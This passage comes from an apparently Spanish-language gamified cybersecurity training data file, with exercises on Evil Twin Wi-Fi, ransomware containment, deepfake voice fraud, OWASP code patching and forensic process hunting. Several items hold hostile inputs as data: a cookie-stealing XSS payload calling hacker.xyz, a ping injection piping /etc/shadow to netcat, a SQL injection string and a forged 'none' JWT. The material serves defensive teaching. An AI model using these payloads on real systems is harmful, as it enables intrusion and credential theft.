      missionObjective: 'Activa la VPN 🛡️, recoge la Llave MFA 🔑 y los 3 Paquetes 📦 evitando los puntos Evil Twin.',
      gridRows: 6,
      gridCols: 6,
      requireVpnBeforeGoal: true,
      requireMfaBeforeGoal: true,
      grid: [
        ['start', 'empty', 'wall', 'vpn_shield', 'empty', 'data_packet'],
        ['empty', 'empty', ' empty' as any, 'sniffer_trap', 'wall', 'empty'].map((c) => (c.trim() as any)),
        ['wall', 'evil_twin_ap', 'empty', 'empty', 'empty', 'mfa_key'],
        ['data_packet', 'empty', 'wall', 'sniffer_trap', 'wall', 'empty'],
        ['empty', 'empty', 'empty', 'empty', 'evil_twin_ap', 'empty'],
        ['wall', 'data_packet', 'sniffer_trap', 'empty', 'empty', 'server_goal'],
      ],
      hazardsLegend: [
        {
          cellType: 'vpn_shield',
          name: 'Túnel VPN WireGuard',
          description: 'Inmuniza a Suri frente a los Sniffers de la red.',
        },
        {
          cellType: 'mfa_key',
          name: 'Token Hardware MFA',
          description: 'Requerido por el servidor Zero Trust para autenticar tu identidad.',
        },
        {
          cellType: 'evil_twin_ap',
          name: 'Router Evil Twin',
          description: 'Punto de acceso malicioso que compromete el dispositivo al contacto.',
        },
      ],
      feedback: {
        empathy: 'A veces pensamos que tener VPN o tener MFA por separado es suficiente.',
        technicalIndicator:
          'La arquitectura Zero Trust combina cifrado de canal (VPN) con verificación fuerte de identidad (MFA) en cada acceso.',
        preventiveTip:
          'Combina siempre conexión cifrada (VPN) con llaves MFA resistentes al phishing para acceder a servidores críticos.',
      },
    },
  ],

  'url-inspector-2': [
    {
      id: 'ex_url_net_01',
      type: 'url_inspector',
      title: 'Misión 1/2: Portal Cautivo Wi-Fi Falso',
      instruction: 'Al conectarte al Wi-Fi del aeropuerto se abre esta dirección pidiendo tu correo corporativo. Toca el bloque malicioso:',
      suriPrompt: 'Analiza el dominio raíz al que este supuesto portal Wi-Fi intenta enviar tu clave de Microsoft 365.',
      suriPoseInitial: 'shield',
      rawUrl: 'http://wifi-aeropuerto.login-office365.captura-claves.top/auth',
      segments: [
        { id: 'sn_1', type: 'protocol', text: 'http://', isSuspicious: false },
        { id: 'sn_2', type: 'subdomain', text: 'wifi-aeropuerto.login-office365.', isSuspicious: false },
        {
          id: 'sn_3',
          type: 'root_domain',
          text: 'captura-claves.top',
          isSuspicious: true,
          annotation: '¡Portal Cautivo Evil Twin! El dominio real es captura-claves.top diseñado para robar tu sesión.',
        },
        { id: 'sn_4', type: 'path', text: '/auth', isSuspicious: false },
      ],
      maliciousSegmentId: 'sn_3',
      attackTechnique: 'deceptive_subdomain',
      hint: 'Revisa el dominio raíz justo antes de "/auth".',
      feedback: {
        empathy: 'Cuando queremos conectarnos rápido a Internet en un viaje, rara vez miramos la URL del portal de bienvenida.',
        technicalIndicator:
          'Los atacantes crean portales cautivos en redes Evil Twin que imitan el inicio de sesión de Google o Microsoft.',
        preventiveTip:
          'Jamás ingreses la contraseña de tu correo empresarial en la página de bienvenida de un Wi-Fi público.',
      },
    },
    {
      id: 'ex_triage_net_02',
      type: 'rapid_triage',
      title: 'Misión 2/2: Triaje de Trabajo Remoto Seguro',
      instruction: 'Clasifica cada práctica de conexión remota antes de que el reloj de 7 segundos llegue a cero:',
      suriPrompt: '¡Demuestra tu dominio del Módulo 3 bajo presión!',
      suriPoseInitial: 'running',
      timeLimitSeconds: 7,
      requiredCorrectPass: 3,
      cards: [
        {
          id: 'c_net_1',
          category: 'push_alert',
          title: 'Red Wi-Fi Abierta sin Contraseña',
          senderSnippet: 'SSID: Aeropuerto_VIP_Gratis',
          bodySnippet: 'Entrar al banco de la empresa conectado al Wi-Fi abierto sin activar la VPN.',
          isThreat: true,
          indicatorText: 'Riesgo crítico de intercepción Man-in-the-Middle.',
        },
        {
          id: 'c_net_2',
          category: 'qr_code',
          title: 'Sticker QR Pegado en Mesa de Cafetería',
          senderSnippet: 'QR sobrepuesto: "Wi-Fi Gratis Escanea Aquí"',
          bodySnippet: 'El código QR redirige a descargar una app .apk de configuración Wi-Fi.',
          isThreat: true,
          indicatorText: 'Ataque QRishing para instalar malware móvil.',
        },
        {
          id: 'c_net_3',
          category: 'email',
          title: 'Conexión vía Hotspot Personal + VPN',
          senderSnippet: 'Protocolo Corporativo WireGuard',
          bodySnippet: 'Usar datos móviles 5G propios con el túnel VPN de la empresa activo.',
          isThreat: false,
          indicatorText: 'Práctica 100% segura para operaciones remotas.',
        },
      ],
      feedback: {
        empathy: 'Los códigos QR en lugares públicos y las redes abiertas son vectores frecuentes contra viajeros de negocios.',
        technicalIndicator:
          'Un sticker QR sobrepuesto puede llevar a descargas maliciosas (.apk) y una red abierta permite el sniffing de tráfico.',
        preventiveTip:
          'Prefiere siempre tu Hotspot móvil personal + VPN corporativa cuando manejes información confidencial fuera de la oficina.',
      },
    },
  ],

  // ---------------------------------------------------------------------------
  // CURSO 4: RESPUESTA A INCIDENTES SOC, RANSOMWARE E IA (DEEPFAKES)
  // ---------------------------------------------------------------------------
  'incident-soc-1': [
    {
      id: 'ex_soc_01',
      type: 'incident_soc',
      title: 'Videojuego SOC: Brote de Ransomware en Contabilidad',
      instruction: '¡Contén el ataque antes de que el cifrado llegue al 100%! Selecciona cada nodo en alerta y aplica el protocolo NIST.',
      suriPrompt: 'En nodos infectados aplica en orden: 1° Aislar VLAN -> 2° Purgar EDR -> 3° Backup 3-2-1. En sesiones robadas: Revocar IAM.',
      suriPoseInitial: 'shield',
      threatName: 'Ransomware LockBit-PYME v4',
      scenarioAlert: 'Un colaborador de Contabilidad ejecutó "Factura.pdf.exe". El ransomware está cifrando archivos e intentando saltar al Servidor ERP.',
      maxEncryptionDangerSeconds: 50,
      requiredSequenceHint: 'Para nodo INFECTADO: [1. Aislar VLAN] -> [2. Purgar EDR] -> [3. Backup 3-2-1]. Para SESIÓN ROBADA: [Revocar IAM].',
      nodes: [
        {
          id: 'node_pc_conta',
          name: 'PC Contabilidad 01',
          role: 'Estación Paciente Cero',
          icon: 'computer',
          initialState: 'infected',
          connectedTo: ['node_erp', 'node_iam'],
          infectionNote: 'ALERTA: Proceso Factura.pdf.exe cifrando disco local y escaneando subred.',
        },
        {
          id: 'node_iam',
          name: 'Directorio de Identidad IAM',
          role: 'Controlador de Sesiones',
          icon: 'badge',
          initialState: 'compromised_iam',
          connectedTo: ['node_pc_conta', 'node_erp'],
          infectionNote: 'ALERTA IAM: Token de sesión robado por infostealer activo.',
        },
        {
          id: 'node_erp',
          name: 'Servidor Central ERP',
          role: 'Base de Datos Financiera',
          icon: 'dns',
          initialState: 'at_risk',
          connectedTo: ['node_pc_conta'],
          infectionNote: 'EN RIESGO: Conectado a la misma VLAN que PC Contabilidad 01.',
        },
        {
          id: 'node_backup',
          name: 'Bóveda Backup 3-2-1',
          role: 'Almacenamiento Inmutable WORM',
          icon: 'cloud_done',
          initialState: 'healthy',
          connectedTo: [],
          infectionNote: 'ESTADO ÓPTIMO: Copia inmutable aislada lista para restaurar nodos limpios.',
        },
      ],
      feedback: {
        empathy: 'Durante un incidente real de ransomware, el pánico suele llevar a apagar servidores sin orden o intentar restaurar copias sobre equipos aún infectados.',
        technicalIndicator:
          'El protocolo NIST SP 800-61 exige primero Contención (aislar la red del host), luego Erradicación (purgar malware y revocar credenciales IAM) y finalmente Recuperación (Backup 3-2-1).',
        preventiveTip:
          'Mantén siempre copias de seguridad bajo la regla 3-2-1 con al menos 1 copia inmutable o desconectada de la red.',
      },
    },
  ],

  'chat-deepfake-1': [
    {
      id: 'ex_chat_deepfake_01',
      type: 'chat_simulator',
      title: 'Simulación: Clonación de Voz con IA (Deepfake Ejecutivo)',
      instruction: 'Recibes una nota de voz en WhatsApp con la voz idéntica de la Directora General pidiendo una transferencia reservada:',
      suriPrompt: 'Con solo 15 segundos de audio público, la IA clona cualquier voz. ¡Aplica el protocolo de verificación verbal!',
      suriPoseInitial: 'idea',
      channel: 'whatsapp',
      attackerContact: {
        displayName: 'Dra. Elena Vargas - Directora General (Número Externo)',
        phoneNumberOrHandle: '+57 300 9981120',
        allegedRole: 'Dirección General',
        isVerifiedBadge: false,
      },
      psychologicalTrigger: 'authority',
      rootNodeId: 'node_df_1',
      dialogueNodes: {
        node_df_1: {
          id: 'node_df_1',
          incomingMessages: [
            {
              id: 'mdf_1',
              sender: 'attacker',
              text: '🎙️ [Nota de Voz 0:18 - Voz idéntica a la Dra. Elena]: "Hola, estoy entrando a firmar la adquisición confidencial y necesito que transfieras $18,000 USD a esta cuenta internacional de inmediato sin comentarlo con nadie más."',
              timestamp: '04:12 PM',
              delayMs: 600,
            },
          ],
          options: [
            {
              id: 'opt_df_1',
              text: 'Suena exactamente igual a la Dra. Elena, procedo con la transferencia inmediata.',
              isSafeChoice: false,
              feedbackImmediate: '¡Fraude por Deepfake de IA! El audio fue generado sintéticamente con IA clonando su voz de una entrevista en YouTube.',
            },
            {
              id: 'opt_df_2',
              text: 'Solicitar la "Palabra Clave de Seguridad Corporativa" y llamar directamente al número interno registrado de la Dra. Elena.',
              isSafeChoice: true,
              feedbackImmediate: '¡Defensa Anti-IA perfecta! El atacante no conocía la palabra clave interna y cortó la comunicación.',
            },
            {
              id: 'opt_df_3',
              text: '🚨 [Botón de Pánico: Escalar intento de Fraude Biométrico con IA al CISO]',
              isSafeChoice: true,
              isPanicButton: true,
              feedbackImmediate: '¡Alerta emitida! Se notificó a toda la empresa sobre el intento de suplantación por voz sintética.',
            },
          ],
        },
      },
      feedback: {
        empathy: 'Nuestro cerebro está programado para confiar plenamente cuando reconoce el timbre de voz de una persona cercana.',
        technicalIndicator:
          'Las herramientas actuales de clonación de voz por IA imitan timbre, entonación y pausas en segundos a partir de audios públicos.',
        preventiveTip:
          'Establece una palabra clave secreta o doble aprobación obligatoria por canal interno para cualquier movimiento de dinero.',
      },
    },
  ],

  'incident-soc-2': [
    {
      id: 'ex_soc_02',
      type: 'incident_soc',
      title: 'Jefe Final: Defensa Total de la Madriguera (Ataque Multi-Vector)',
      instruction: '¡Ataque coordinado en 4 nodos! Aísla primero los dos equipos infectados para frenar el reloj, revoca las sesiones IAM y restaura la red.',
      suriPrompt: '¡Prioridad táctica! Si aíslas primero los 2 nodos infectados, el avance del cifrado se reducirá drásticamente.',
      suriPoseInitial: 'running',
      threatName: 'APT Sombra-Cifrada · Ataque Simultáneo',
      scenarioAlert: '¡Dos estaciones tienen Ransomware activo y dos servicios tienen robo de credenciales IAM simultáneo!',
      maxEncryptionDangerSeconds: 60,
      requiredSequenceHint: '1° Aísla ambos nodos INFECTADOS -> 2° Revoca ambos nodos IAM -> 3° Purga EDR y Restaura Backup 3-2-1.',
      nodes: [
        {
          id: 'node_j1',
          name: 'Laptop Tesorería',
          role: 'Terminal de Pagos',
          icon: 'laptop_mac',
          initialState: 'infected',
          connectedTo: ['node_j3'],
          infectionNote: 'CRÍTICO: Ransomware activo cifrando carpetas compartidas.',
        },
        {
          id: 'node_j2',
          name: 'Servidor de Archivos NAS',
          role: 'Repositorio Documental',
          icon: 'storage',
          initialState: 'infected',
          connectedTo: ['node_j4'],
          infectionNote: 'CRÍTICO: Segundo foco de cifrado detectado en partición SMB.',
        },
        {
          id: 'node_j3',
          name: 'Consola Cloud SSO',
          role: 'Proveedor de Identidad',
          icon: 'cloud_sync',
          initialState: 'compromised_iam',
          connectedTo: ['node_j1'],
          infectionNote: 'ALERTA IAM: Sesión administrativa iniciada desde IP anónima.',
        },
        {
          id: 'node_j4',
          name: 'Gateway VPN Corporativo',
          role: 'Acceso Remoto',
          icon: 'vpn_key',
          initialState: 'compromised_iam',
          connectedTo: ['node_j2'],
          infectionNote: 'ALERTA IAM: Credencial de contratista externo comprometida.',
        },
      ],
      feedback: {
        empathy: 'Enfrentar múltiples alertas simultáneas en una emergencia real pone a prueba la calma de cualquier líder de seguridad.',
        technicalIndicator:
          'Aislar primero todos los focos de infección detiene la propagación exponencial, permitiendo luego revocar accesos IAM, purgar con EDR y restaurar backups limpios.',
        preventiveTip:
          '¡Excelente trabajo en la Consola SOC! Avanza ahora hacia los cursos de Seguridad Web OWASP y Forense Digital.',
      },
    },
  ],

  // ---------------------------------------------------------------------------
  // CURSO 5: SEGURIDAD WEB OWASP & BLINDAJE DEVSECOPS
  // ---------------------------------------------------------------------------
  'code-patcher-1': [
    {
      id: 'ex_patch_01',
      type: 'code_patcher',
      title: 'Videojuego: Escudo DevSecOps (Inyección SQL y XSS)',
      instruction: '¡Exploits entrantes hacia el servidor de la PYME! Inspecciona la línea roja vulnerable e inyecta el Hotfix seguro antes del impacto.',
      suriPrompt: 'Reemplaza la concatenación insegura por Consultas Parametrizadas (?) y sanitización DOM.',
      suriPoseInitial: 'shield',
      appName: 'Portal Web PYME · API v2.1',
      waves: [
        {
          id: 'wave_sqli_1',
          vulnerabilityName: 'OWASP A03 · Inyección SQL (SQLi en Login)',
          endpoint: 'POST /api/auth/login',
          attackerPayload: " email = \"admin@pyme.com' OR '1'='1' --\" ",
          vulnerableCodeLines: [
            'app.post("/api/auth/login", async (req, res) => {',
            '  const { email, password } = req.body;',
            '  const sql = "SELECT * FROM users WHERE email = \'" + email + "\' AND pass = \'" + password + "\'";',
            '  const user = await db.query(sql);',
            '});',
          ],
          vulnerableLineIndex: 2,
          options: [
            {
              id: 'p_sqli_ok',
              label: 'Parche A: Consulta Parametrizada (Prepared Statement)',
              securityLayer: 'Prepared Statement SQL',
              codeReplacement: '  const user = await db.execute("SELECT * FROM users WHERE email = ? AND pass_hash = ?", [email, hash(password)]);',
              isCorrect: true,
              explanation: '¡Exacto! Los marcadores (?) separan los datos del comando SQL, neutralizando cualquier inyección booleana.',
            },
            {
              id: 'p_sqli_bad1',
              label: 'Parche B: Comillas dobles en vez de simples',
              securityLayer: 'Concatenación Débil',
              codeReplacement: '  const sql = `SELECT * FROM users WHERE email = "${email}"`;',
              isCorrect: false,
              explanation: 'Cambiar comillas simples por dobles sigue permitiendo inyectar comillas dobles en el payload.',
            },
            {
              id: 'p_sqli_bad2',
              label: 'Parche C: Ocultar el formulario con CSS',
              securityLayer: 'Seguridad por Oscuridad',
              codeReplacement: '  // Validar solo en el frontend con maxlength="20"',
              isCorrect: false,
              explanation: 'Los atacantes envían peticiones directas a la API saltándose el navegador.',
            },
          ],
        },
        {
          id: 'wave_xss_1',
          vulnerabilityName: 'OWASP A03 · Cross-Site Scripting (XSS Almacenado)',
          endpoint: 'POST /api/soporte/comentario',
          attackerPayload: '<script>fetch("https://hacker.xyz/steal?c=" + document.cookie)</script>',
          vulnerableCodeLines: [
            'function renderizarComentarioCliente(comentario) {',
            '  const contenedor = document.getElementById("chat-box");',
            '  contenedor.innerHTML = "<div class=\'msg\'>" + comentario.texto + "</div>";',
            '}',
          ],
          vulnerableLineIndex: 2,
          options: [
            {
              id: 'p_xss_bad1',
              label: 'Parche A: Usar document.write() directo',
              securityLayer: 'DOM Inseguro',
              codeReplacement: '  document.write(comentario.texto);',
              isCorrect: false,
              explanation: 'document.write ejecuta directamente cualquier etiqueta <script> inyectada.',
            },
            {
              id: 'p_xss_ok',
              label: 'Parche B: Asignación Segura textContent + Sanitización DOMPurify',
              securityLayer: 'Escape HTML + CSP',
              codeReplacement: '  contenedor.textContent = DOMPurify.sanitize(comentario.texto, { ALLOWED_TAGS: [] });',
              isCorrect: true,
              explanation: '¡Blindado! textContent y DOMPurify impiden que el navegador interprete texto como código JavaScript.',
            },
          ],
        },
      ],
      feedback: {
        empathy: 'Cuando desarrollamos rápido, concatenar strings en SQL o usar innerHTML parece la vía más corta.',
        technicalIndicator:
          'Las vulnerabilidades de inyección (OWASP A03) ocurren cuando datos no confiables se interpretan como código ejecutable por el motor SQL o el navegador.',
        preventiveTip:
          'Utiliza siempre consultas parametrizadas en base de datos y escape automático de contenido en el frontend.',
      },
    },
  ],

  'owasp-url-5': [
    {
      id: 'ex_url_owasp_01',
      type: 'url_inspector',
      title: 'Misión 1/2: Detección de Robo de Sesión y Redirección Abierta',
      instruction: 'Un atacante envió este enlace que aprovecha un parámetro de redirección para robar el token de sesión. Toca el segmento malicioso:',
      suriPrompt: 'Fíjate en la ruta final: está redirigiendo tu token activo hacia un servidor externo malicioso.',
      suriPoseInitial: 'shield',
      rawUrl: 'https://portal.mipyme.com/oauth/callback?redirect_to=https://collector-tokens.xyz/steal',
      segments: [
        { id: 'so_1', type: 'protocol', text: 'https://', isSuspicious: false },
        { id: 'so_2', type: 'subdomain', text: 'portal.', isSuspicious: false },
        { id: 'so_3', type: 'root_domain', text: 'mipyme.com', isSuspicious: false },
        {
          id: 'so_4',
          type: 'path',
          text: '/oauth/callback?redirect_to=https://collector-tokens.xyz/steal',
          isSuspicious: true,
          annotation: '¡Vulnerabilidad Open Redirect! El parámetro redirect_to envía el token OAuth al dominio del atacante collector-tokens.xyz.',
        },
      ],
      maliciousSegmentId: 'so_4',
      attackTechnique: 'suspicious_tld',
      hint: 'Inspecciona el parámetro ?redirect_to= al final de la URL.',
      feedback: {
        empathy: 'Como el dominio principal sí es "mipyme.com", muchas personas confían sin leer los parámetros largos de la URL.',
        technicalIndicator:
          'Un ataque Open Redirect abusa de parámetros de redirección no validados para desviar tokens de autenticación hacia servidores externos.',
        preventiveTip:
          'En desarrollo web, valida siempre que cualquier URL de redirección pertenezca a una lista blanca estricta de dominios internos.',
      },
    },
    {
      id: 'ex_triage_owasp_02',
      type: 'rapid_triage',
      title: 'Misión 2/2: Triaje de Prácticas Seguras de API',
      instruction: 'Clasifica cada implementación técnica en menos de 7 segundos:',
      suriPrompt: '¡Identifica qué configuraciones cumplen el estándar OWASP!',
      suriPoseInitial: 'running',
      timeLimitSeconds: 7,
      requiredCorrectPass: 3,
      cards: [
        {
          id: 'c_ow_1',
          category: 'invoice',
          title: 'Endpoint IDOR sin validación de propietario',
          senderSnippet: 'GET /api/nominas?empleadoId=104',
          bodySnippet: 'Cualquier usuario logueado puede ver el sueldo de otro cambiando el número 104 por 105.',
          isThreat: true,
          indicatorText: 'Vulnerabilidad crítica OWASP A01: Control de Acceso Roto.',
        },
        {
          id: 'c_ow_2',
          category: 'push_alert',
          title: 'Llave Secreta de Stripe/AWS en el Frontend',
          senderSnippet: 'Archivo main.js público',
          bodySnippet: 'Incluir claves privadas sk_live_... directamente dentro del código JavaScript del navegador.',
          isThreat: true,
          indicatorText: 'Exposición crítica de credenciales en el cliente.',
        },
        {
          id: 'c_ow_3',
          category: 'email',
          title: 'Cookies de Sesión con HttpOnly + Secure + SameSite',
          senderSnippet: 'Configuración de Cabecera Set-Cookie',
          bodySnippet: 'La cookie de autenticación no puede ser leída por scripts de JavaScript maliciosos.',
          isThreat: false,
          indicatorText: 'Excelente defensa contra robo de sesión por XSS.',
        },
      ],
      feedback: {
        empathy: 'Los errores de configuración en APIs son hoy el objetivo número uno de los escáneres automatizados.',
        technicalIndicator:
          'Proteger secretos en variables de entorno del servidor y validar permisos por cada objeto (Anti-IDOR) blinda la capa de aplicación.',
        preventiveTip:
          'Realiza auditorías de código y pruebas de acceso cruzado antes de publicar cualquier endpoint nuevo.',
      },
    },
  ],

  'code-patcher-2': [
    {
      id: 'ex_patch_02',
      type: 'code_patcher',
      title: 'Jefe DevSecOps: Blindaje Total del Portal PYME (3 Oleadas)',
      instruction: 'Supera las 3 oleadas de ataque avanzado contra la pasarela de facturación: IDOR, Command Injection y SQLi.',
      suriPrompt: '¡Mantén la integridad del backend por encima de 0% inyectando los 3 parches de grado militar!',
      suriPoseInitial: 'cool',
      appName: 'Pasarela Financiera PYME · Core API',
      waves: [
        {
          id: 'wave_idor_1',
          vulnerabilityName: 'OWASP A01 · Escalada IDOR en Descarga de Facturas',
          endpoint: 'GET /api/facturas/descargar?id=9002',
          attackerPayload: 'GET /api/facturas/descargar?id=9002 (Usuario actual: ID 450 intentando leer factura de Gerencia)',
          vulnerableCodeLines: [
            'app.get("/api/facturas/descargar", authMiddleware, async (req, res) => {',
            '  const factura = await FacturaModel.findById(req.query.id);',
            '  return res.sendFile(factura.rutaPdf);',
            '});',
          ],
          vulnerableLineIndex: 1,
          options: [
            {
              id: 'p_idor_ok',
              label: 'Parche A: Verificar propiedad del recurso con el ID del token JWT',
              securityLayer: 'Control de Acceso RBAC',
              codeReplacement: '  const factura = await FacturaModel.findOne({ _id: req.query.id, ownerUserId: req.user.uid }); if (!factura) return res.status(403).end();',
              isCorrect: true,
              explanation: '¡Perfecto! Al exigir que ownerUserId coincida con req.user.uid del token autenticado, se bloquea cualquier acceso IDOR.',
            },
            {
              id: 'p_idor_bad',
              label: 'Parche B: Cambiar GET por POST sin verificar usuario',
              securityLayer: 'Método HTTP',
              codeReplacement: '  const factura = await FacturaModel.findById(req.body.id);',
              isCorrect: false,
              explanation: 'Cambiar GET a POST no impide que el atacante modifique el ID en el cuerpo JSON de la petición.',
            },
          ],
        },
        {
          id: 'wave_rce_2',
          vulnerabilityName: 'OWASP A03 · Inyección de Comandos en el Sistema Operativo (RCE)',
          endpoint: 'POST /api/red/diagnostico-ping',
          attackerPayload: 'host = "8.8.8.8; cat /etc/shadow | nc 185.220.101.5 4444"',
          vulnerableCodeLines: [
            'app.post("/api/red/diagnostico-ping", async (req, res) => {',
            '  const { host } = req.body;',
            '  exec("ping -c 1 " + host, (err, stdout) => res.send(stdout));',
            '});',
          ],
          vulnerableLineIndex: 2,
          options: [
            {
              id: 'p_rce_bad',
              label: 'Parche A: Filtrar solo la palabra "cat"',
              securityLayer: 'Blacklist Incompleta',
              codeReplacement: '  exec("ping -c 1 " + host.replace("cat", ""));',
              isCorrect: false,
              explanation: 'Una lista negra simple se evade usando otros comandos como head, more, curl o wget.',
            },
            {
              id: 'p_rce_ok',
              label: 'Parche B: Validar formato IP estricto + usar execFile sin shell',
              securityLayer: 'Allowlist + Sin Shell',
              codeReplacement: '  if (!isValidIpAddress(host)) return res.status(400).end(); execFile("/bin/ping", ["-c", "1", host], cb);',
              isCorrect: true,
              explanation: '¡Excelente! execFile no invoca un intérprete de comandos shell y la validación de IP rechaza cualquier ";" o "|".',
            },
          ],
        },
        {
          id: 'wave_jwt_3',
          vulnerabilityName: 'OWASP A07 · Falsificación de Token JWT (Algoritmo "none")',
          endpoint: 'GET /api/admin/exportar-clientes',
          attackerPayload: 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.',
          vulnerableCodeLines: [
            'function verificarSesionAdmin(req, res, next) {',
            '  const token = req.headers.authorization?.split(" ")[1];',
            '  const payload = jwt.decode(token); // ¡No verifica la firma criptográfica!',
            '  if (payload.role === "admin") return next();',
            '}',
          ],
          vulnerableLineIndex: 2,
          options: [
            {
              id: 'p_jwt_ok',
              label: 'Parche A: Verificar firma criptográfica con clave secreta y algoritmo fijo',
              securityLayer: 'Verificación Criptográfica',
              codeReplacement: '  const payload = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ["HS256"] });',
              isCorrect: true,
              explanation: '¡Exacto! jwt.verify con algoritmo explícito valida la firma HMAC y rechaza tokens alterados o sin firma.',
            },
            {
              id: 'p_jwt_bad',
              label: 'Parche B: Codificar el token dos veces en Base64',
              securityLayer: 'Codificación Simple',
              codeReplacement: '  const payload = JSON.parse(atob(token));',
              isCorrect: false,
              explanation: 'Base64 no es cifrado ni firma; cualquiera puede decodificarlo y modificar su rol a "admin".',
            },
          ],
        },
      ],
      feedback: {
        empathy: 'Los ataques a la lógica de autorización (IDOR y JWT) son silenciosos porque parecen tráfico normal.',
        technicalIndicator:
          'Verificar la firma criptográfica de los tokens (jwt.verify), evitar shells del sistema (execFile) y comprobar la propiedad de cada registro blindan el backend.',
        preventiveTip:
          '¡Has dominado el Curso 5 de Seguridad Web OWASP y DevSecOps!',
      },
    },
  ],

  // ---------------------------------------------------------------------------
  // CURSO 6: FORENSE DIGITAL, CAZA DE AMENAZAS (THREAT HUNTING) & ANTI-IA
  // ---------------------------------------------------------------------------
  'forensic-hunt-1': [
    {
      id: 'ex_forensic_01',
      type: 'forensic_investigator',
      title: 'Videojuego CSI Cyber: Caza de Troyanos en Memoria RAM',
      instruction: 'Inspecciona los procesos en ejecución, elimina únicamente los 2 troyanos que exfiltran datos a IPs externas y dictamina la causa raíz.',
      suriPrompt: '¡Ojo de águila! No elimines los procesos legítimos firmados por Microsoft. Busca nombres con números camuflados y puertos 4444/8443.',
      suriPoseInitial: 'idea',
      hostName: 'SRV-FINANZAS-01 (Windows Server)',
      incidentBrief: 'El firewall detectó tráfico saliente inusual desde el servidor de finanzas. Dos procesos camuflados están exfiltrando datos hacia un servidor C2.',
      processes: [
        {
          id: 'proc_1',
          pid: 1044,
          processName: 'svchost.exe',
          signatureStatus: 'signed_microsoft',
          remoteEndpoint: 'Localhost / Servicios de Red Windows',
          cpuUsage: '2.1%',
          behaviorAlert: 'Proceso anfitrión legítimo del sistema operativo en C:\\Windows\\System32.',
          isMalicious: false,
          forensicClue: 'Proceso crítico de Windows con firma digital auténtica.',
        },
        {
          id: 'proc_2',
          pid: 4892,
          processName: 'svch0st.exe',
          signatureStatus: 'unsigned_suspicious',
          remoteEndpoint: '185.220.101.34:4444 (C2 Activo)',
          cpuUsage: '38.5%',
          behaviorAlert: 'ALERTA: Ejecutándose desde C:\\Users\\Public\\Temp. Enviando bloques cifrados cada 10s.',
          isMalicious: true,
          forensicClue: 'Técnica Masquerading (T1036): usa un cero "0" para imitar a svchost.exe y abre un socket reverso al puerto 4444.',
        },
        {
          id: 'proc_3',
          pid: 2310,
          processName: 'explorer.exe',
          signatureStatus: 'signed_microsoft',
          remoteEndpoint: 'Sin conexiones externas',
          cpuUsage: '1.4%',
          behaviorAlert: 'Interfaz gráfica de usuario estándar de Windows.',
          isMalicious: false,
          forensicClue: 'Proceso legítimo firmado por Microsoft Corporation.',
        },
        {
          id: 'proc_4',
          pid: 6612,
          processName: 'Factura_Marzo_pdf.exe',
          signatureStatus: 'spoofed_cert',
          remoteEndpoint: '91.215.85.19:8443 (Exfiltración)',
          cpuUsage: '44.0%',
          behaviorAlert: 'ALERTA: Leyendo documentos de la carpeta /Contabilidad y subiéndolos por HTTPS.',
          isMalicious: true,
          forensicClue: 'Ejecutable con doble extensión (.pdf.exe) que inició la cadena de infección y el canal C2.',
        },
      ],
      rootCauseQuestion: 'Según los procesos maliciosos capturados en la memoria RAM, ¿cuál fue el vector inicial de infección (Paciente Cero)?',
      rootCauseOptions: [
        {
          id: 'rc_1',
          text: 'La ejecución de un archivo adjunto de phishing con doble extensión ("Factura_Marzo_pdf.exe") que desplegó el troyano "svch0st.exe".',
          isCorrect: true,
          explanation: '¡Análisis forense impecable! El binario Factura_Marzo_pdf.exe actuó como Dropper e inyectó el proceso persistente svch0st.exe en Temp.',
        },
        {
          id: 'rc_2',
          text: 'Un fallo físico del disco duro en la carpeta C:\\Windows\\System32.',
          isCorrect: false,
          explanation: 'El incidente fue provocado por los dos ejecutables maliciosos conectados a las IPs C2 externas.',
        },
        {
          id: 'rc_3',
          text: 'El proceso oficial explorer.exe de Microsoft.',
          isCorrect: false,
          explanation: 'explorer.exe tenía firma oficial verificada y ninguna conexión externa.',
        },
      ],
      feedback: {
        empathy: 'Los atacantes eligen nombres como svch0st.exe precisamente porque a simple vista lucen idénticos a los del sistema.',
        technicalIndicator:
          'Verificar la firma digital del binario, su ruta de ejecución (Temp vs System32) y los sockets remotos permite aislar la amenaza sin dañar el servidor.',
        preventiveTip:
          'Bloquea por directiva (AppLocker / SRP) la ejecución de programas .exe desde carpetas temporales o de descargas.',
      },
    },
  ],

  'forensic-hunt-2': [
    {
      id: 'ex_forensic_02',
      type: 'forensic_investigator',
      title: 'Videojuego CSI Cyber: Infostealers y Cryptominers Ocultos',
      instruction: 'Detecta y elimina los 2 procesos intrusos que están robando cookies del navegador y minando criptomonedas en el servidor.',
      suriPrompt: 'Revisa qué procesos sin firma están leyendo la base de datos de contraseñas de Chrome/Edge o consumiendo 85% de CPU.',
      suriPoseInitial: 'shield',
      hostName: 'WKS-GERENCIA-04 (Estación Ejecutiva)',
      incidentBrief: 'La estación de Gerencia presenta lentitud extrema y alertas de inicio de sesión desde otro continente. Investiga la memoria RAM.',
      processes: [
        {
          id: 'proc_b1',
          pid: 7105,
          processName: 'LummaStealer_agent.exe',
          signatureStatus: 'unsigned_suspicious',
          remoteEndpoint: '194.26.135.77:443 (Telegram Bot C2)',
          cpuUsage: '18.2%',
          behaviorAlert: 'CRÍTICO: Extrayendo archivo "Login Data" y cookies de sesión del navegador Chrome.',
          isMalicious: true,
          forensicClue: 'Infostealer activo robando tokens de sesión para saltar el MFA (Session Hijacking).',
        },
        {
          id: 'proc_b2',
          pid: 880,
          processName: 'lsass.exe',
          signatureStatus: 'signed_microsoft',
          remoteEndpoint: 'Localhost (Subsistema de Autoridad de Seguridad)',
          cpuUsage: '0.9%',
          behaviorAlert: 'Servicio oficial de autenticación del sistema Windows en System32.',
          isMalicious: false,
          forensicClue: 'lsass.exe legítimo firmado por Microsoft. Terminarlo reiniciaría el equipo.',
        },
        {
          id: 'proc_b3',
          pid: 9340,
          processName: 'xmrig_worker64.exe',
          signatureStatus: 'spoofed_cert',
          remoteEndpoint: 'pool.hashvault.pro:3333 (Stratum Mining)',
          cpuUsage: '86.4%',
          behaviorAlert: 'ALERTA: Uso intensivo de CPU/GPU ejecutando algoritmo de minería Monero oculto.',
          isMalicious: true,
          forensicClue: 'Cryptominer no autorizado consumiendo los recursos eléctricos y de cómputo de la empresa.',
        },
        {
          id: 'proc_b4',
          pid: 3120,
          processName: 'MsMpEng.exe',
          signatureStatus: 'signed_microsoft',
          remoteEndpoint: 'Microsoft Defender Cloud Protection',
          cpuUsage: '4.2%',
          behaviorAlert: 'Motor antivirus oficial de Windows Defender.',
          isMalicious: false,
